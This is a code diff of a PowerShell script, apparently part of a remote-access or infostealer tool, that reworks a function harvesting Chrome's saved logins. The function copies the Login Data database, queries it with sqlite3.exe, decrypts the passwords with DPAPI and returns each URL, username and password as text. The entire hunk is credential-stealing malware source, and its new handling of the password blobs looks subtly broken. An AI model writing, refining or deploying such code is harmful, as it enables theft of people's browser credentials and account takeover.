@@ -22,50 +22,58 @@ function Connect-ZiPo {
 
     function Get-ChromePasswords {
     try {
-        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        $chromeDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
         $tempDb = "$env:TEMP\chrome_login_temp.db"
+        $sqlite = "sqlite3.exe"
 
-        if (-not (Test-Path $chromeLoginPath)) {
-            return "[ERROR] Chrome login database not found"
+        if (-not (Test-Path $chromeDb)) {
+            return "[ERROR] Chrome Login Data not found"
         }
 
-        Copy-Item $chromeLoginPath $tempDb -Force
+        if (-not (Get-Command $sqlite -ErrorAction SilentlyContinue)) {
+            return "[ERROR] sqlite3.exe not found in PATH"
+        }
 
-        # Загружаем SQLite assembly
-        Add-Type -AssemblyName System.Data
+        Copy-Item $chromeDb $tempDb -Force
 
-        $connectionString = "Data Source=$tempDb;Version=3;"
-        $conn = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
-        $conn.Open()
-
-        $cmd = $conn.CreateCommand()
-        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-        $reader = $cmd.ExecuteReader()
+        $query = "SELECT origin_url, username_value, password_value FROM logins"
+        $rawResults = & $sqlite $tempDb $query
 
         $results = ""
 
-        while ($reader.Read()) {
-            $url = $reader["origin_url"]
-            $user = $reader["username_value"]
-            $passBytes = $reader["password_value"]
+        foreach ($line in $rawResults) {
+            $fields = $line -split '\|'
+            if ($fields.Length -ne 3) { continue }
 
-            # Расшифровка пароля с использованием DPAPI
-            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                $passBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-            )
-            $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
+            $url = $fields[0].Trim()
+            $user = $fields[1].Trim()
+            $passBlob = [Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Default.GetBytes($fields[2])))
 
-            $results += "`n[URL] $url`n[USER] $user`n[PASS] $password`n"
+            # Decrypt password using DPAPI
+            try {
+                $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                    $passBlob, $null,
+                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+                )
+                $pass = [System.Text.Encoding]::UTF8.GetString($decrypted)
+            }
+            catch {
+                $pass = "[UNREADABLE]"
+            }
+
+            $results += "`n[URL] $url`n[USER] $user`n[PASS] $pass`n"
         }
 
-        $reader.Close()
-        $conn.Close()
         Remove-Item $tempDb -Force
+
+        if ([string]::IsNullOrWhiteSpace($results)) {
+            return "[INFO] No passwords found or unable to decrypt"
+        }
 
         return $results
     }
     catch {
-        return "[ERROR] Failed to extract Chrome passwords: $($_.Exception.Message)"
+        return "[ERROR] Chrome password extraction failed: $($_.Exception.Message)"
     }
 }
     
